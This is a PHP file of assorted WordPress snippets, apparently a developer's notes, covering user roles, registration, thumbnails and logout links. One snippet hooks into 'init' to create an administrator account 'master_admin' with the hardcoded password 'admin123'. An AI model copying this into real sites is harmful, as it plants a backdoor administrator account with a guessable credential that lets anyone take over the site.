<?php 
// For specific role
$current_user = wp_get_current_user();
if (in_array('student', $current_user->roles)) {

}

if (in_array('teacher', $current_user->roles)) {

}


// Current ID 
$user_id  = get_current_user_id();

	

// Add Role in user
// this on activation
add_role('student', 'Student', array('read'=> true, 'upload_files' => true));
add_role('coach', 'Coach', array('read'=> true));


// image
$post_thumbnail_id = get_post_thumbnail_id( $key->ID ); 
$thumbnail = wp_get_attachment_image_src($post_thumbnail_id ,'thumbnail', false); 


// Create admin through code
function wpb_admin_account(){
	$user = 'master_admin';
	$pass = 'admin123';
	$email = 'master_admin@admin.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	} 
}
add_action('init','wpb_admin_account');


// Registration
global $wpdb;
$userdata = array(
	'user_login'  =>  $form['userName'],
	'user_email' => $form['userEmail'],
	'user_pass'   => $form['password'],
	'first_name' => $form['userFirst'],
	'last_name' => $form['userLast'],
);
$user_id = wp_insert_user( $userdata );

add_user_meta( $user_id,'shop_name', $form['shop_name'], false);

/* defining role as marketplace seller*/
$user_role = new WP_User($user_id);
		//$user_role->remove_role(get_option('default_role');
$user_role->add_role('wk_marketplace_seller');
if(get_option('wkmp_auto_approve_seller')){
	$user_role->set_role('wk_marketplace_seller');
}else{
	$user_role->set_role(get_option('default_role'));
}

$msg = array(
	'msg' 	=> 'Your account has been created! <a href="'.site_url('/my-account/').'" style="font-size: 13px;">Click here for Login</a>',
	'class' => 'isa_error isa_sucess',
);
return $msg = json_encode($msg);

?>

<a class="right logout-url" href="<?php echo wp_logout_url(site_url()); ?>">Logout</a>



<?php 

// Meta box for admin - show payment history of user
function EV_cms_show_meta_box($user){
	global $obj, $wpdb;
	$getaall = $obj->getRows($wpdb->prefix.'usermeta' , ['where' =>
		['user_id' => $user->ID, 'meta_key' => 'ev_payment_on_signup'  ],
	]);
	if (in_array('coach', $user->roles) || in_array('administrator', $user->roles)) {
		
		


	}
}
add_action('edit_user_profile','EV_cms_show_meta_box');

 ?>

<!-- Logout url -->
 <?php echo wp_logout_url(site_url()); ?>